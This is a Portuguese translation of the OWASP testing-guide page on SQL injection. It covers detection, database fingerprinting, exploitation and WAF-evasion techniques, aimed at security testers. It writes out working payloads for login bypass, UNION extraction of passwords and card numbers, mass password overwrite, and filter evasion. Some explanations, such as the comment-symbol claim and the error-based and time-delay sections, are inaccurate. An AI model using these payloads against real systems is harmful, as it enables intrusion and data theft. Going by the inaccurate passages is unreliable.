# Testando a Injeção de SQL

|ID          |
|------------|
|WSTG-INPV-05|

## Resumo

O teste de injeção de SQL verifica se é possível injetar dados na aplicação de forma que ela execute uma consulta SQL controlada pelo usuário no banco de dados. Os testadores encontram uma vulnerabilidade de injeção de SQL se a aplicação utilizar entrada do usuário para criar consultas SQL sem validação adequada de entrada. A exploração bem-sucedida dessa classe de vulnerabilidade permite que um usuário não autorizado acesse ou manipule dados no banco de dados.

Um [ataque de injeção de SQL](https://owasp.org/www-community/attacks/SQL_Injection) consiste na inserção ou "injeção" de uma consulta SQL parcial ou completa por meio da entrada de dados ou transmitida pelo cliente (navegador) para a aplicação web. Um ataque bem-sucedido de injeção de SQL pode ler dados sensíveis do banco de dados, modificar dados do banco de dados (inserir/atualizar/excluir), executar operações de administração no banco de dados (como desligar o DBMS), recuperar o conteúdo de um determinado arquivo existente no sistema de arquivos do DBMS ou gravar arquivos no sistema de arquivos e, em alguns casos, emitir comandos para o sistema operacional. Ataques de injeção de SQL são um tipo de ataque de injeção, no qual comandos SQL são injetados na entrada do plano de dados para afetar a execução de comandos SQL predefinidos.

Geralmente, a maneira como as aplicações web constroem declarações SQL envolvendo a sintaxe SQL escrita pelos programadores é misturada com dados fornecidos pelo usuário. Exemplo:

`select title, text from news where id=$id`

No exemplo acima, a variável `$id` contém dados fornecidos pelo usuário, enquanto o restante é a parte estática SQL fornecida pelo programador; tornando a declaração SQL dinâmica.

Devido à forma como foi construída, o usuário pode fornecer entrada criada tentando fazer a declaração SQL original executar mais ações da escolha do usuário. O exemplo abaixo ilustra os dados fornecidos pelo usuário "10 or 1=1", alterando a lógica da declaração SQL, modificando a cláusula WHERE adicionando uma condição "or 1=1".

`select title, text from news where id=10 or 1=1`

Os ataques de Injeção de SQL podem ser divididos nas seguintes três classes:

- Inband: dados são extraídos usando o mesmo canal usado para injetar o código SQL. Este é o tipo mais direto de ataque, no qual os dados recuperados são apresentados diretamente na página da web da aplicação.
- Out-of-band: dados são recuperados usando um canal diferente (por exemplo, um e-mail com os resultados da consulta é gerado e enviado ao testador).
- Inferencial ou Cego: não há transferência real de dados, mas o testador é capaz de reconstruir as informações enviando solicitações específicas e observando o comportamento resultante do Servidor de BD.

Um ataque bem-sucedido de Injeção de SQL requer que o atacante elabore uma consulta SQL sintaticamente correta. Se a aplicação retornar uma mensagem de erro gerada por uma consulta incorreta, então pode ser mais fácil para um atacante reconstruir a lógica da consulta original e, portanto, entender como realizar a injeção corretamente. No entanto, se a aplicação ocultar os detalhes do erro, então o testador deve ser capaz de engenharia reversa na lógica da consulta original.

Sobre as técnicas para explorar falhas de injeção de SQL, existem cinco técnicas comuns. Essas técnicas às vezes podem ser usadas de forma combinada (por exemplo, operador de união e fora de banda):

- Operador de União: pode ser usado quando a falha de injeção de SQL ocorre em uma instrução SELECT, possibilitando combinar duas consultas em um único resultado ou conjunto de resultados.
- Booleano: use condição(ões) booleana(s) para verificar se determinadas condições são verdadeiras ou falsas.
- Baseado em erro: esta técnica força o banco de dados a gerar um erro, fornecendo ao atacante ou testador informações para refinar sua injeção.
- Fora de banda: técnica usada para recuperar dados usando um canal diferente (por exemplo, fazer uma conexão HTTP para enviar os resultados para um servidor web).
- Atraso de tempo: use comandos de banco de dados (por exemplo, sleep) para atrasar respostas em consultas condicionais. É útil quando o atacante não possui algum tipo de resposta (resultado, saída ou erro) da aplicação.

## Objetivos do Teste

- Identificar pontos de injeção de SQL.
- Avaliar a gravidade da injeção e o nível de acesso que pode ser obtido por meio dela.

## Como Testar

### Técnicas de Detecção

O primeiro passo neste teste é entender quando a aplicação interage com um Servidor de BD para acessar alguns dados. Exemplos típicos de casos em que uma aplicação precisa conversar com um BD incluem:

- Formulários de autenticação: quando a autenticação é realizada usando um formulário web, é provável que as credenciais do usuário sejam verificadas em um banco de dados que contenha todos os nomes de usuários e senhas (ou, melhor, hashes de senhas).
- Motores de busca: a string enviada pelo usuário pode ser usada em uma consulta SQL que extrai todos os registros relevantes de um banco de dados.
- Sites de comércio eletrônico: os produtos e suas características (preço, descrição, disponibilidade, etc) são muito provavelmente armazenados em um banco de dados.

O testador deve fazer uma lista de todos os campos de entrada cujos valores podem ser usados para elaborar uma consulta SQL, incluindo os campos ocultos de requisições POST, e então testá-los separadamente, tentando interferir na consulta e gerar um erro. Considere também os cabeçalhos HTTP e Cookies.

O primeiro teste geralmente consiste em adicionar uma única aspa simples `'` ou um ponto e vírgula `;` ao campo ou parâmetro em teste. A primeira é usada em SQL como um terminador de string e, se não for filtrada pela aplicação, levaria a uma consulta incorreta. O segundo é usado para finalizar uma declaração SQL e, se não for filtrado, também é provável que gere um erro.

 A saída de um campo vulnerável pode se parecer com o seguinte (em um Microsoft SQL Server, neste caso):

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

Também delimitadores de comentário (`--` ou `/* */`, etc) e outras palavras-chave SQL como `AND` e `OR` podem ser usados para tentar modificar a consulta. Uma técnica muito simples, mas às vezes ainda eficaz, é simplesmente inserir uma string onde se espera um número, pois um erro como o seguinte pode ser gerado:

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

Monitore todas as respostas do servidor web e dê uma olhada no código fonte HTML/JavaScript. Às vezes, o erro está presente dentro deles, mas por algum motivo (por exemplo, erro de JavaScript, comentários HTML, etc) não é apresentado ao usuário. Uma mensagem de erro completa, como aquelas nos exemplos, fornece uma riqueza de informações ao testador para montar um ataque de injeção bem-sucedido. No entanto, as aplicações muitas vezes não fornecem tantos detalhes: um simples 'Erro de Servidor 500' ou uma página de erro personalizada pode ser emitida, o que significa que precisamos usar técnicas de injeção cega. Em qualquer caso, é muito importante testar cada campo separadamente: apenas uma variável deve variar enquanto todas as outras permanecem constantes, para entender precisamente quais parâmetros são vulneráveis e quais não são.

### Teste Padrão de Injeção de SQL

#### Injeção de SQL Clássica

Considere a seguinte consulta SQL:

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

Uma consulta semelhante é geralmente usada pela aplicação web para autenticar um usuário. Se a consulta retornar um valor, significa que dentro do banco de dados existe um usuário com esse conjunto de credenciais e, portanto, o usuário é permitido fazer login no sistema; caso contrário, o acesso é negado. Os valores dos campos de entrada geralmente são obtidos do usuário por meio de um formulário web. Suponha que inserimos os seguintes valores de Nome de Usuário e Senha:

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1`

A consulta será:

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

Se supusermos que os valores dos parâmetros são enviados para o servidor por meio do método GET, e se o domínio do site vulnerável for www.exemplo.com, a solicitação que realizaremos será:

`http://www.exemplo.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`

Após uma breve análise, notamos que a consulta retorna um valor (ou um conjunto de valores) porque a condição é sempre verdadeira (OR 1=1). Dessa forma, o sistema autenticou o usuário sem saber o nome de usuário e a senha.

> Em alguns sistemas, a primeira linha de uma tabela de usuários seria um usuário administrador. Este pode ser o perfil retornado em alguns casos.

Outro exemplo de consulta é o seguinte:

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

Neste caso, há dois problemas, um devido ao uso dos parênteses e outro devido ao uso da função de hash MD5. Primeiro, resolvemos o problema dos parênteses. Isso consiste simplesmente em adicionar um número de parênteses de fechamento até obtermos uma consulta corrigida. Para resolver o segundo problema, tentamos contornar a segunda condição. Adicionamos à nossa consulta um símbolo final que significa que um comentário está começando. Dessa forma, tudo o que segue esse símbolo é considerado um comentário. Cada SGBD tem sua própria sintaxe para comentários, no entanto, um símbolo comum para a grande maioria dos bancos de dados é `*`. No Oracle, o símbolo é `--`. Dito isso, os valores que usaremos como Nome de Usuário e Senha são:

`$username = 1' or '1' = '1'))/*`

`$password = foo`

Dessa forma, obteremos a seguinte consulta:

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

(Devido à inclusão de um delimitador de comentário no valor $username, a parte de senha da consulta será ignorada.)

A solicitação de URL será:

`http://www.exemplo.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`

Isso pode retornar um número de valores. Às vezes, o código de autenticação verifica se o número de registros/resultados retornados é exatamente igual a 1. Nos exemplos anteriores, essa situação seria difícil (no banco de dados há apenas um valor por usuário). Para contornar esse problema, é suficiente inserir um comando SQL que imponha uma condição de que o número de resultados retornados deve ser um. (Um registro retornado) Para alcançar esse objetivo, usamos o operador `LIMIT <num>`, onde `<num>` é o número de resultados/registros que queremos que seja retornado. Em relação ao exemplo anterior, o valor dos campos Nome de Usuário e Senha será modificado da seguinte forma:

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

Dessa forma, criamos uma solicitação como a seguinte:

`http://www.exemplo.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`

#### Declaração SELECT

Considere a seguinte consulta SQL:

`SELECT * FROM produtos WHERE id_produto=$id_produto`

Considere também a solicitação a um script que executa a consulta acima:

`http://www.exemplo.com/produto.php?id=10`

Quando o testador tenta um valor válido (por exemplo, 

10 neste caso), a aplicação retornará a descrição de um produto. Uma boa maneira de testar se a aplicação é vulnerável nesse cenário é jogar com a lógica, usando os operadores AND e OR.

Considere a solicitação:

`http://www.exemplo.com/produto.php?id=10 AND 1=2`

`SELECT * FROM produtos WHERE id_produto=10 AND 1=2`

Neste caso, provavelmente a aplicação retornaria alguma mensagem informando que não há conteúdo disponível ou uma página em branco. Então, o testador pode enviar uma declaração verdadeira e verificar se há um resultado válido:

`http://www.exemplo.com/produto.php?id=10 AND 1=1`

#### Consultas Empilhadas

Dependendo da API que a aplicação web está usando e do SGBD (por exemplo, PHP + PostgreSQL, ASP+SQL SERVER), pode ser possível executar várias consultas em uma chamada.

Considere a seguinte consulta SQL:

`SELECT * FROM produtos WHERE id_produto=$id_produto`

Uma maneira de explorar o cenário acima seria:

`http://www.exemplo.com/produto.php?id=10; INSERT INTO users (…)`

Dessa forma, é possível executar muitas consultas seguidas e independentes da primeira consulta.

### Impressão Digital do Banco de Dados

Embora a linguagem SQL seja um padrão, cada SGBD tem suas peculiaridades e difere entre si em muitos aspectos como comandos especiais, funções para recuperar dados como nomes de usuários e bancos de dados, recursos, linhas de comentários, etc.

Quando os testadores avançam para uma exploração de injeção de SQL mais avançada, eles precisam saber qual é o banco de dados de back-end.

#### Erros Retornados pela Aplicação

A primeira maneira de descobrir qual banco de dados de back-end está sendo usado é observando o erro retornado pela aplicação. Os seguintes são alguns exemplos de mensagens de erro:

MySql:

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

Um UNION SELECT completo com version() também pode ajudar a saber o banco de dados de back-end.

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle:

`ORA-00933: SQL command not properly ended`

MS SQL Server:

```html
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL:

```html
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

Se não houver mensagem de erro ou uma mensagem de erro personalizada, o testador pode tentar injetar em campos de string usando técnicas de concatenação variadas:

- MySql: ‘test’ + ‘ing’
- SQL Server: ‘test’ ‘ing’
- Oracle: ‘test’||’ing’
- PostgreSQL: ‘test’||’ing’

### Técnicas de Exploração

#### Técnica de Exploração de União

O operador UNION é usado em injeções de SQL para unir uma consulta, propositadamente forjada pelo testador, à consulta original. O resultado da consulta forjada será unido ao resultado da consulta original, permitindo que o testador obtenha os valores das colunas de outras tabelas. Suponha para nossos exemplos que a consulta executada a partir do servidor seja a seguinte:

`SELECT Nome, Telefone, Endereço FROM Users WHERE Id=$id`

Vamos definir o seguinte valor `$id`:

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Teremos a seguinte consulta:

`SELECT Nome, Telefone, Endereço FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Que unirá o resultado da consulta original com todos os números de cartão de crédito na tabela CreditCardTable. A palavra-chave `ALL` é necessária para contornar consultas que usam a palavra-chave `DISTINCT`. Além disso, notamos que além dos números de cartão de crédito, selecionamos mais dois valores. Esses dois valores são necessários porque as duas consultas devem ter um número igual de parâmetros/colunas para evitar um erro de sintaxe.

O primeiro detalhe que um testador precisa para explorar a vulnerabilidade de injeção de SQL usando essa técnica é encontrar os números certos de colunas na declaração SELECT.

Para conseguir isso, o testador pode usar a cláusula `ORDER BY` seguida de um número que indica a numeração das colunas selecionadas no banco de dados:

`http://www.exemplo.com/produto.php?id=10 ORDER BY 10--`

Se a consulta for executada com sucesso, o testador pode assumir, neste exemplo, que há 10 ou mais colunas na declaração `SELECT`. Se a consulta falhar, então deve haver menos de 10 colunas retornadas pela consulta. Se houver uma mensagem de erro disponível, provavelmente seria:

`Coluna '10' desconhecida na cláusula 'order'`

Depois que o testador descobrir o número de colunas, o próximo passo é descobrir o tipo de colunas. Supondo que houvesse 3 colunas no exemplo acima, o testador poderia tentar cada tipo de coluna, usando o valor NULL para ajudá-los:

`http://www.exemplo.com/produto.php?id=10 UNION SELECT 1,null,null--`

Se a consulta falhar, o testador provavelmente verá uma mensagem como:

`Todas as células em uma coluna devem ter o mesmo tipo de dado`

Se a consulta for executada com sucesso, a primeira coluna pode ser um número inteiro. Então, o testador pode prosseguir e assim por diante:

`http://www.exemplo.com/produto.php?id=10 UNION

 SELECT null,1,null--`

`http://www.exemplo.com/produto.php?id=10 UNION SELECT null,null,1--`

Quando o testador souber os tipos de colunas corretos, ele pode começar a extrair dados do banco de dados usando a sintaxe correta:

`http://www.exemplo.com/produto.php?id=10 UNION SELECT null,username,null FROM users--`

`http://www.exemplo.com/produto.php?id=10 UNION SELECT null,password,null FROM users--`

#### Técnica de Exploração Baseada em Erro

A técnica de exploração baseada em erro usa um comando SQL que é projetado para falhar, mas, quando falha, gera uma mensagem de erro que inclui dados sensíveis do banco de dados. Um exemplo clássico disso é tentar injetar um número de coluna inexistente em uma consulta SQL.

Por exemplo:

`http://www.exemplo.com/produto.php?id=10 AND 1=2 UNION SELECT 1,2,3,4--`

Se a consulta falhar com uma mensagem de erro, o testador pode aprender informações úteis do erro. Isso pode incluir o tipo de banco de dados (por exemplo, Microsoft SQL Server, MySQL, etc.), bem como informações sobre o esquema do banco de dados e os nomes das tabelas e colunas.

#### Técnica de Exploração de Time Delay

A técnica de exploração de tempo é uma forma de ataque cego. Isso significa que o testador não recebe uma resposta direta do servidor, mas ainda pode determinar se a injeção de SQL teve sucesso ou não com base em quanto tempo demora para o servidor responder.

Essa técnica envolve a introdução de um atraso intencional em uma consulta SQL. Se o servidor levar mais tempo para responder do que o normal, isso pode indicar que a injeção de SQL teve sucesso.

Por exemplo, suponha que o testador esteja tentando determinar o número de colunas em uma consulta SQL. Ele pode fazer isso injetando uma consulta que sabidamente falhará, mas que incluirá um comando de atraso de tempo. Por exemplo:

`http://www.exemplo.com/produto.php?id=10 AND SLEEP(5)`

Se o servidor levar mais de 5 segundos para responder, isso pode indicar que a injeção de SQL teve sucesso e que é possível que haja uma condição de tempo presente.

### Exemplos de Código

#### Prevenção de Injeção de SQL em PHP

É importante que os desenvolvedores estejam cientes das melhores práticas para evitar injeções de SQL em seus aplicativos web. Abaixo está um exemplo de código PHP que ilustra como evitar injeções de SQL usando declarações preparadas:

```php
<?php
// Conexão com o banco de dados
$servername = "localhost";
$username = "username";
$password = "password";
$dbname = "myDB";

// Criar conexão
$conn = new mysqli($servername, $username, $password, $dbname);

// Checar conexão
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

// Prepare e executar uma instrução SQL parametrizada
$stmt = $conn->prepare("SELECT * FROM Users WHERE Username=? AND Password=?");
$stmt->bind_param("ss", $username, $password);

// Definir parâmetros e executar
$username = $_POST['username'];
$password = $_POST['password'];
$stmt->execute();

// Obter resultados
$result = $stmt->get_result();

// Exibir resultados
while ($row = $result->fetch_assoc()) {
  echo "Username: " . $row["Username"] . " - Password: " . $row["Password"] . "<br>";
}

// Fechar conexão
$stmt->close();
$conn->close();
?>
```

Neste exemplo, uma instrução SQL parametrizada é preparada com espaços reservados para os valores que serão inseridos posteriormente. Em seguida, os valores são vinculados aos espaços reservados usando o método `bind_param()`. Isso impede que os valores fornecidos pelos usuários sejam interpretados como parte da instrução SQL principal, ajudando a evitar injeções de SQL.
#### Injeção de Procedimento Armazenado

Ao utilizar SQL dinâmico dentro de um procedimento armazenado, a aplicação deve sanitizar adequadamente a entrada do usuário para eliminar o risco de injeção de código. Se não for sanitizada, o usuário pode inserir SQL malicioso que será executado dentro do procedimento armazenado.

Considere o seguinte Procedimento Armazenado do SQL Server:

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```

Entrada do usuário:

```sql
anyusername or 1=1'
anypassword
```

Este procedimento não sanitiza a entrada, permitindo assim que o valor de retorno mostre um registro existente com esses parâmetros.

> Este exemplo pode parecer improvável devido ao uso de SQL dinâmico para fazer login de um usuário, mas considere uma consulta de relatório dinâmico onde o usuário seleciona as colunas para visualizar. O usuário poderia inserir código malicioso neste cenário e comprometer os dados.

Considere o seguinte Procedimento Armazenado do SQL Server:

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go
```

Entrada do usuário:

```sql
1 from users; update users set password = 'password'; select *
```

Isso resultará na execução do relatório e na atualização das senhas de todos os usuários.

#### Exploração Automatizada

A maioria das situações e técnicas apresentadas aqui podem ser realizadas de forma automatizada usando algumas ferramentas. Neste artigo, o testador pode encontrar informações sobre como realizar uma auditoria automatizada usando [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap).

### Técnicas de Evasão de Assinaturas de Injeção de SQL

As técnicas são usadas para contornar defesas como firewalls de aplicativos da Web (WAFs) ou sistemas de prevenção de intrusões (IPSs). Consulte também [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF).

#### Espaços em Branco

Remover espaços ou adicionar espaços que não afetarão a instrução SQL. Por exemplo:

```sql
or 'a'='a'

or 'a'  =    'a'
```

Adicionar caracteres especiais como nova linha ou tabulação que não alterarão a execução da instrução SQL. Por exemplo:

```sql
or
'a'=
        'a'
```

#### Bytes Nulos

Use byte nulo (%00) antes de quaisquer caracteres que o filtro esteja bloqueando.

Por exemplo, se o atacante puder injetar o seguinte SQL:

`' UNION SELECT password FROM Users WHERE username='admin'--`

para adicionar Bytes Nulos será:

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### Comentários SQL

Adicionar comentários SQL inline também pode ajudar na validade da instrução SQL e contornar o filtro de injeção de SQL. Considere esta injeção de SQL como exemplo.

`' UNION SELECT password FROM Users WHERE name='admin'--`

Adicionando comentários SQL inline:

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### Codificação de URL

Use a [codificação de URL online](https://meyerweb.com/eric/tools/dencoder/) para codificar a instrução SQL.

`' UNION SELECT password FROM Users WHERE name='admin'--`

A codificação de URL da instrução de injeção de SQL será:

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### Codificação de Caracteres

A função Char() pode ser usada para substituir caracteres em inglês. Por exemplo, char(114,111,111,116) significa root.

`' UNION SELECT password FROM Users WHERE name='root'--`

Para aplicar o Char(), a instrução de injeção de SQL será:

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### Concatenação de Strings

A concatenação divide as palavras-chave SQL e evita filtros. A sintaxe de concatenação varia de acordo com o mecanismo do banco de dados. Tome o motor MS SQL como exemplo.

`select 1`

A simples instrução SQL pode ser alterada da seguinte forma usando concatenação:

`EXEC('SEL' + 'ECT 1')`

#### Codificação Hexadecimal

A técnica de codificação hexadecimal usa codificação hexadecimal para substituir caracteres da instrução SQL original. Por exemplo, `root` pode ser representado como `726F6F74`.

`Select user from users where name = 'root'`

A instrução SQL usando valor HEX será:

`Select user from users where name = 726F6F74`

ou

`Select user from users where name = unhex('726F6F74')`

#### Declaração de Variáveis

Declare a instrução de injeção de SQL em uma variável e a execute.

Por exemplo, a instrução de injeção de SQL abaixo

`Union Select password`

Defina a instrução SQL na variável `SQLivar`

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### Expressão Alternativa de 'or 1 = 1'

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

## Remediação

- Para proteger a aplicação contra vulnerabilidades de injeção de SQL, consulte o [SQL Injection Prevention CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection

_Prevention_Cheat_Sheet.html).
- Para proteger o servidor SQL, consulte o [Database Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html).

Para validação genérica de segurança de entrada, consulte o [Input Validation CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).

## Ferramentas

- [Fuzzdb - SQL Injection Fuzz Strings (da ferramenta wfuzz)](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
- [sqlbftools](http://packetstormsecurity.org/files/43795/sqlbftools-1.2.tar.gz.html)
- [Bernardo Damele A. G.: sqlmap, ferramenta automática de injeção de SQL](http://sqlmap.org/)
- [Muhaimin Dzulfakar: MySqloit, ferramenta de tomada de controle de injeção de MySql](https://github.com/dtrip/mysqloit)

## Referências

- [Top 10 2017-A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

Páginas do Guia de Testes específicas de tecnologia foram criadas para os seguintes SGBDs:

- [Oracle](05.1-Testing_for_Oracle.md)
- [MySQL](05.2-Testing_for_MySQL.md)
- [SQL Server](05.3-Testing_for_SQL_Server.md)
- [PostgreSQL](05.4-Testing_PostgreSQL.md)
- [MS Access](05.5-Testing_for_MS_Access.md)
- [NoSQL](05.6-Testing_for_NoSQL_Injection.md)
- [ORM](05.7-Testing_for_ORM_Injection.md)
- [Cliente-side](05.8-Testing_for_Client-side.md)

### Whitepapers

- [Victor Chapela: "Advanced SQL Injection"](http://cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
- [Chris Anley: "More Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Imperva: "Blinded SQL Injection"](https://www.imperva.com/lg/lgw.asp?pid=369)
- [Ferruh Mavituna: "SQL Injection Cheat Sheet"](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/)
- [Kevin Spett da SPI Dynamics: "SQL Injection"](https://docs.google.com/file/d/0B5CQOTY4YRQCSWRHNkNaaFMyQTA/edit)
- [Kevin Spett da SPI Dynamics: "Blind SQL Injection"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
- ["ZeQ3uL" (Prathan Phongthiproek) e "Suphot Boonchamnan": "Beyond SQLi: Obfuscate and Bypass"](https://www.exploit-db.com/papers/17934/)
- [Adi Kaploun e Eliran Goshen, Check Point Threat Intelligence & Research Team: "The Latest SQL Injection Trends"](http://blog.checkpoint.com/2015/05/07/latest-sql-injection-trends/)

### Documentação sobre Vulnerabilidades de Injeção de SQL em Produtos

- [Anatomia da injeção de SQL no sistema de filtragem de comentários de banco de dados do Drupal SA-CORE-2015-003](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003)